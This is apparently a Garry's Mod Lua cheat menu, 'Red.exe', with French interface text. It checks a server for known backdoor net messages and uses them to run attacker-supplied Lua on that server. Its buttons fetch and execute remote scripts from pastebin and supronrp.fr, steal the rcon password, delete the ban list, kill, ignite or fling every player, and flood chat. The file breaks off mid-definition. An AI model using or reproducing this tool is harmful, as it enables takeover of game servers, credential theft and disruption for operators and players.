--[[
 __     ____  ___  __ __  ____ ____      ____  _  _    ____     ___     ___   ____
 ||    ||    // \\ || // ||    || \\     || )) \\//    || \\   // \\   // \\ ||   
 ||    ||==  ||=|| ||<<  ||==  ||  ))    ||=)   )/     ||  )) ((   )) (( ___ ||== 
 ||__| ||___ || || || \\ ||___ ||_//     ||_)) //      ||_//   \\_//   \\_|| ||___
                                                                         
]]--
function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

MsgC (Color(math.random(255), math.random(255), math.random(255)), [[
======================================================================================================================= 

/$$$$$$$                  /$$                                  
| $$__  $$                | $$                                  
| $$  \ $$  /$$$$$$   /$$$$$$$      /$$$$$$  /$$   /$$  /$$$$$$ 
| $$$$$$$/ /$$__  $$ /$$__  $$     /$$__  $$|  $$ /$$/ /$$__  $$
| $$__  $$| $$$$$$$$| $$  | $$    | $$$$$$$$ \  $$$$/ | $$$$$$$$
| $$  \ $$| $$_____/| $$  | $$    | $$_____/  >$$  $$ | $$_____/
| $$  | $$|  $$$$$$$|  $$$$$$$ /$$|  $$$$$$$ /$$/\  $$|  $$$$$$$
|__/  |__/ \_______/ \_______/|__/ \_______/|__/  \__/ \_______/


 __     ____  ___  __ __  ____ ____      ____  _  _    ____     ___     ___   ____
 ||    ||    // \\ || // ||    || \\     || )) \\//    || \\   // \\   // \\ ||   
 ||    ||==  ||=|| ||<<  ||==  ||  ))    ||=)   )/     ||  )) ((   )) (( ___ ||== 
 ||__| ||___ || || || \\ ||___ ||_//     ||_)) //      ||_//   \\_//   \\_|| ||___
                                                                                  
                                                        
======================================================================================================================= 

Bienvenue sur Red.exe un menu privé par RedBoxing !

======================================================================================================================= 

Changelog : 
	Mis à jour du 03/07/18
[+] un launcher crypter est disponible

======================================================================================================================= 

Discord :	https://discord.gg/CdppShu
Steam   :   https://steamcommunity.com/id/thedevman/
Twitter :   https://twitter.com/TheDevMan_
	
======================================================================================================================= 

Lancement efféctuer avec succès !
Bonne Destruction !								   
]])

sound.PlayURL ( "https://supronrp.fr/secret/open.mp3", "mono", function( station )
	if ( IsValid( station ) ) then

		station:SetPos( LocalPlayer():GetPos() )

		station:Play()
	else

		LocalPlayer():ChatPrint( "Echec Du Chargement De La Musique :/" )

	end
end )

if file.Exists( "includes/extensions/client/vehicle.lua", "LUA" ) == true then
surface.PlaySound("ambient/alarms/klaxon1.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 0, 0 ), "!Cake Anti-Cheat détecter fait gaffe  !!" )
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Pas de !Cake Anti-Cheat détecter fout le bordel." )
end

surface.CreateFont( "Title", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )
surface.CreateFont( "creditsfont", {  
    font = "Roboto",
    extended = false,
    size = 40,
    weight = 700,
    blursize = 0,
    scanlines = 0,
    antialias = true,
} )
surface.CreateFont( "APG_sideBar_font", {
    font = "Arial",
    size = 18,
    weight = 1500,
} )

LocalPlayer():ChatPrint( "RedBoxing te souhaite la bienvenue. Dans la console fait Red.exe" )


-- CHECKER
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
	
    if( ValidNetString("backdoorfixer") ) then
        netKey = "backdoorfixer"
    else
    end
	
    if( ValidNetString("redboxing") ) then
        netKey = "redboxing"
    else
    end
----------------------------

---------------------
--  SPLOIT NOTIFY  --
---------------------
function SploitNotify(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 500, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 3, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end
---------------------

---------------------
--  Principale Frame--
---------------------
function Menu()
local frame = vgui.Create("DFrame")
    frame:SetSize(1050, 700)
    frame:SetPos( ScrW() - 1, -1 )
	frame:ShowCloseButton(false)
	frame:SetTitle("")
    frame:MakePopup()
    frame.Paint = function(panel, w, h)
    local hsv = HSVToColor( RealTime() * 120 % 360, 1, 1 )
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, frame:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.DrawText( "Red.exe by RedBoxing", "DermaLarge", 425, 15, Color(hsv.r, hsv.g, hsv.b) )
    end
    frame:MoveTo( ScrW() - 1400, 200, .2, 1, -1, function()
end);

  local closeButton = vgui.Create("DButton",frame)
        closeButton:SetPos(frame:GetWide() - 20,4)
        closeButton:SetSize(16,16)
        closeButton:SetText('')
        closeButton.DoClick = function()
            frame:Remove()
        end
        closeButton.Paint = function(i,w,h)
            draw.RoundedBox(0,0,0,w,h,Color(20, 20, 20,3))
            draw.DrawText( "✕", "APG_sideBar_font",0, -2, Color( 189, 189, 189), 3 )
        end
		
		local panelcommand = vgui.Create("DPanel", frame)
		panelcommand:SetPos(40, 80)
		panelcommand:SetSize(170, 550)
		panelcommand.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
draw.DrawText( "SSV", "DermaLarge", 50, 5, Color(hsv.r, hsv.g, hsv.b) )
end
	local panelfun = vgui.Create("DPanel", frame)
		panelfun:SetPos(240, 80)
		panelfun:SetSize(170, 550)
		panelfun.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
draw.DrawText( "FUN", "DermaLarge", 50, 5, Color(hsv.r, hsv.g, hsv.b) )
end
	local panelcontrol = vgui.Create("DPanel", frame)
		panelcontrol:SetPos(440, 80)
		panelcontrol:SetSize(170, 550)
		panelcontrol.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
draw.DrawText( "CONTROLE", "DermaLarge", 20, 5, Color(hsv.r, hsv.g, hsv.b) )
end
	local panelspam = vgui.Create("DPanel", frame)
		panelspam:SetPos(640, 80)
		panelspam:SetSize(170, 550)
		panelspam.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
draw.DrawText( "SPAM", "DermaLarge", 50, 5, Color(hsv.r, hsv.g, hsv.b) )
end
local panelSong = vgui.Create("DPanel", frame)
		panelSong:SetPos(840, 80)
		panelSong:SetSize(170, 550)
		panelSong.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
draw.DrawText( "SOUNDBOX", "DermaLarge", 15, 5, Color(hsv.r, hsv.g, hsv.b) )
end
		
---------------------

--------------------
-- SSV--
--------------------

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcommand)
Macro:SetPos( 25, 40 )
Macro:SetText( "SSV 1 - DESTRUCTION" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "DESTRUCTEUR de serveur activé" )
net.Start(netKey)
SploitNotify("RIP Serveur ??? - 2018")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "http.Fetch(\"https://supronrp.fr/secret/rip.lua\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer() 
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcommand)
Macro:SetPos( 25, 70 )
Macro:SetText( "SSV 2 - PLS" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcommand)
Macro:SetPos( 25, 100 )
Macro:SetText( "SSV 3 - ASRIEL" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "ASRIEL DOMINE DESORMAIT LE SERVEUR" )
net.Start(netKey)
SploitNotify("ASRIEL DOMINE DESORMAIT LE SERVEUR")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/eUVnvQjn\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer() 
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcommand)
Macro:SetPos( 25, 130 )
Macro:SetText( "SSV 4 - backdoor" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcommand)
Macro:SetPos( 25, 160 )
Macro:SetText( "SSV 5 - Satan" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "SATAN est là..." )
net.Start(netKey)
SploitNotify("SATAN is here")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "http.Fetch(\"https://supronrp.fr/secret/satan.lua\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer() 
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcommand)
Macro:SetPos( 25, 190 )
Macro:SetText( "SSV 6 - PrikZo.exe" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "DESTRUCTEUR de serveur activé" )
net.Start(netKey)
SploitNotify("NYAN CAT is here")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/FdF1ENyh\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer() 
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcommand)
Macro:SetPos( 25, 500 )
Macro:SetText( "RESET LES SPAM" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Spam reset" )
net.Start(netKey)
SploitNotify("SPAM RESET")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "http.Fetch(\"https://supronrp.fr/secret/clean.lua\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer() 
end

----------------

--------------------
-- CONTROLE--
--------------------

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcontrol)
Macro:SetPos( 25, 40 )
Macro:SetText( "RCON STEALER" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
net.Start(netKey)
SploitNotify("RCON STEALER")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/uhT2BcGh\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password pas trouvé, veuillez réessayer ^^" )
end 
end )
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcontrol)
Macro:SetPos( 25, 70 )
Macro:SetText( "NIQUER LES DATA" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 0, 0 ), "Encore en Dev..." )
surface.PlaySound("buttons/blip1.wav") 
SploitNotify("holala les dev vont ce faire chier...s")
net.Start(netKey)
net.WriteString( "http.Fetch(\'https://pastebin.com/2Ka9YA6J\',function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelcontrol)
Macro:SetPos( 25, 100 )
Macro:SetText( "Débanire tout les ban" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Tout le monde est debanni" )
    SploitNotify("Plus personne n'est banni.")
    surface.PlaySound("buttons/blip1.wav") 
end


----------------

--------------------
-- FUN--
--------------------

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelfun)
Macro:SetPos( 25, 40 )
Macro:SetText( "Lancer les joueurs" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Lancer tout le monde sur toutes la map activÃ©" )
SploitNotify("Tout le monde c'est envolé")
    surface.PlaySound("buttons/blip1.wav") 
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelfun)
Macro:SetPos( 25, 70 )
Macro:SetText( "Ajouter 1.000.000.000€" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "MONEY MONEY MONEY" )
net.Start(netKey)
SploitNotify("MONEY MONEY MONEY")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "for k,v in pairs(player.GetAll()) do v:addMoney(1000000000) end) end" )
net.WriteBit(1)
net.SendToServer()
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelfun)
Macro:SetPos( 25, 100 )
Macro:SetText( "1.000.000.000 toute les 0.1sec" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "MONEY MONEY MONEY" )
net.Start(netKey)
SploitNotify("MONEY MONEY MONEY")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent1000000000\", 0.1, 0, function() v:addMoney(1000000000) end) end" )
net.WriteBit(1)
net.SendToServer()
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelfun)
Macro:SetPos( 25, 130 )
Macro:SetText( "Grosse tête" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelfun)
Macro:SetPos( 25, 160 )
Macro:SetText( "2D Player" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelfun)
Macro:SetPos( 25, 190 )
Macro:SetText( "Changer le nom des joueurs" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Nom des joueurs changer" )
net.Start(netKey)
SploitNotify("Nom des joueurs changer")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( " for k,v in pairs(player.GetAll()) do v:setDarkRPVar( \"rpname\", \"нαcĸed вy red.eхe [redвoхιɴɢ ]\" ) end" )
net.WriteBit (1)
net.SendToServer()
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelfun)
Macro:SetPos( 25, 220 )
Macro:SetText( "Mettre en feu les joueurs" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Les joueurs ont pris feu" )
net.Start(netKey)
SploitNotify("Mais où sont les pompier ?")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit (1)
net.SendToServer()
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelfun)
Macro:SetPos( 25, 250 )
Macro:SetText( "Tuer tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Tout le monde est mort" )
net.Start(netKey)
SploitNotify("Tout le monde est mort")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit (1)
net.SendToServer()
end

----------------

--------------------
-- SPAM--
--------------------

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelspam)
Macro:SetPos( 25, 40 )
Macro:SetText( "SPAM 1 - HACKED" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Tout le monde est mort" )
net.Start(netKey)
SploitNotify("Tout le monde est mort")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString("timer.Create( \"hacked\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"нαcĸed вy red.eхe [ redвoхιɴɢ ]\")]]) end)")
net.WriteBit (1)
net.SendToServer()
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelspam)
Macro:SetPos( 25, 70 )
Macro:SetText( "SPAM 2 - SEIZED" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelspam)
Macro:SetPos( 25, 100 )
Macro:SetText( "SPAM 3 - FUCKED" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelspam)
Macro:SetPos( 25, 130 )
Macro:SetText( "Forcer les joueurs a dire" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "RedBoxing DOMINE" )
net.Start(netKey)
SploitNotify("RedBoxing DOMINE")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("say RedBoxing NOUS DOMINE") end]])
net.WriteBit (1)
net.SendToServer()
end
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelspam)
Macro:SetPos( 25, 500 )
Macro:SetText( "STOP SPAM" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 120, 25 )
Macro.Paint = function(panel, w, h)
    local hsv = HSVToColor( CurTime() % 6 * 60, 1, 1 )
surface.SetDrawColor(hsv.r, hsv.g, hsv.b,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(20,20,20,math.random(25,75))
surface.DrawRect(0, 0, w, h)
end
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Red.exe", "] ", Color( 255, 255, 255 ), "Spam Reset" )
net.Start(netKey)
SploitNotify("Spam Reset")
surface.PlaySound("buttons/blip1.wav") 
net.WriteString([[
	timer.Stop("hacked")
]])
net.WriteBit (1)
net.SendToServer()
end
----------------
--------------------
-- SONG--
--------------------
local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(panelSong)
Macro:SetPos( 25, 40 )
